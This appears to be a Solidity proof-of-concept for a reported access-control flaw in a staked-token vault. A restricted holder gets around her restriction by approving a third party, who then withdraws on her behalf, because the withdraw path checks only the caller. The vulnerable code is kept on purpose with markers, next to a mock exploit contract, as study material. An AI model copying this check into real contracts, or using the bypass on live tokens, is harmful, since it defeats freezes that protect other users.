// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  InfiniFi — StakedToken holders can circumvent restriction by approving
    another address to withdraw (R0bert / Spearbit March 2025, finding #55053)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: _withdraw only checks ActionRestriction on `caller`, not on
    `owner`. _update also skips the restriction check on burns (and mints).
    A restricted staked-token holder can approve an unrestricted third party;
    that party calls withdraw(assets, receiver, owner) and burns the owner's
    shares, returning the underlying. The transfer restriction is bypassed.

    Vulnerable checks preserved with @> VULN markers.
    FIX: also validate that `owner` is not restricted in _withdraw. */

error ActionRestricted(address account, uint256 until);

/// @dev Minimal ERC20 underlying (iUSD).
contract MockAsset {
    string public name = "iUSD";
    string public symbol = "iUSD";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Reduced StakedToken (ERC4626-like) with action restriction.
contract StakedToken {
    MockAsset public immutable asset;
    mapping(address => uint256) public balanceOf; // shares
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) public restrictedUntil; // block.timestamp bound
    uint256 public totalSupply;
    uint256 public totalAssets;

    constructor(MockAsset asset_) {
        asset = asset_;
    }

    function setRestriction(address account, uint256 until) external {
        restrictedUntil[account] = until;
    }

    function _checkActionRestriction(address account) internal view {
        uint256 until = restrictedUntil[account];
        if (until != 0 && block.timestamp < until) {
            revert ActionRestricted(account, until);
        }
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        _checkActionRestriction(msg.sender);
        asset.transferFrom(msg.sender, address(this), assets);
        shares = assets; // 1:1
        balanceOf[receiver] += shares;
        totalSupply += shares;
        totalAssets += assets;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares) {
        shares = assets; // 1:1
        _withdraw(msg.sender, receiver, owner, assets, shares);
    }

    /// @dev Vulnerable _withdraw (StakedToken.sol#L139): only checks caller.
    function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares)
        internal
    {
        _checkActionRestriction(caller); // @> VULN: owner (and receiver) never validated
        // FIX: _checkActionRestriction(owner);
        if (caller != owner) {
            uint256 a = allowance[owner][caller];
            require(a >= shares, "allowance");
            if (a != type(uint256).max) allowance[owner][caller] = a - shares;
        }
        _update(owner, address(0), shares); // burn
        totalAssets -= assets;
        asset.transfer(receiver, assets);
    }

    /// @dev Vulnerable _update: restriction skipped on mint/burn.
    function _update(address _from, address _to, uint256 _value) internal {
        if (_from != address(0) && _to != address(0)) {
            // check action restrictions if the transfer is not a burn nor a mint
            _checkActionRestriction(_from);
        }
        // @> VULN: burn path skips _from restriction (shares leave restricted owner)
        if (_from == address(0)) {
            totalSupply += _value;
            balanceOf[_to] += _value;
        } else if (_to == address(0)) {
            balanceOf[_from] -= _value;
            totalSupply -= _value;
        } else {
            balanceOf[_from] -= _value;
            balanceOf[_to] += _value;
        }
    }
}

/// @dev Helper EOA-like wallet for multi-actor flow without cheatcodes.
contract Actor {
    function deposit(StakedToken vault, MockAsset asset, uint256 amt) external {
        asset.approve(address(vault), amt);
        vault.deposit(amt, address(this));
    }

    function approveShares(StakedToken vault, address spender, uint256 amt) external {
        vault.approve(spender, amt);
    }

    function tryWithdraw(StakedToken vault, uint256 assets, address receiver, address owner)
        external
        returns (bool ok)
    {
        try vault.withdraw(assets, receiver, owner) {
            ok = true;
        } catch {
            ok = false;
        }
    }

    function withdraw(StakedToken vault, uint256 assets, address receiver, address owner) external {
        vault.withdraw(assets, receiver, owner);
    }
}

contract Exploit {
    MockAsset public iusd; // CREATE nonce 1
    StakedToken public siusd; // CREATE nonce 2 — vulnerable
    Actor public alice; // CREATE nonce 3 — restricted holder
    Actor public anyAddress; // CREATE nonce 4 — unrestricted spender

    bool public aliceDirectWithdrawReverted;
    uint256 public aliceAssetsAfter;

    constructor() {
        iusd = new MockAsset();
        siusd = new StakedToken(iusd);
        alice = new Actor();
        anyAddress = new Actor();
    }

    function run() external {
        // Fund Alice with 1000 iUSD and deposit into the staked vault.
        iusd.mint(address(alice), 1000e18);
        alice.deposit(siusd, iusd, 1000e18);
        require(siusd.balanceOf(address(alice)) == 1000e18, "alice shares");

        // Restrict Alice (transfer/withdraw blocked for her address).
        // Use far-future timestamp so restriction is active at call time.
        siusd.setRestriction(address(alice), type(uint256).max);

        // Alice approves an unrestricted third party for her full share balance.
        alice.approveShares(siusd, address(anyAddress), 1000e18);

        // Direct withdraw by restricted Alice MUST revert.
        aliceDirectWithdrawReverted =
            !alice.tryWithdraw(siusd, 1000e18, address(alice), address(alice));
        require(aliceDirectWithdrawReverted, "alice direct withdraw should fail");

        // Unrestricted anyAddress withdraws ON BEHALF of restricted Alice.
        anyAddress.withdraw(siusd, 1000e18, address(alice), address(alice));

        aliceAssetsAfter = iusd.balanceOf(address(alice));
        // HARM: restriction circumvented — Alice received full underlying via proxy.
        require(siusd.balanceOf(address(alice)) == 0, "shares should be burned");
        require(aliceAssetsAfter == 1000e18, "harm not demonstrated: alice should hold iUSD");
    }
}
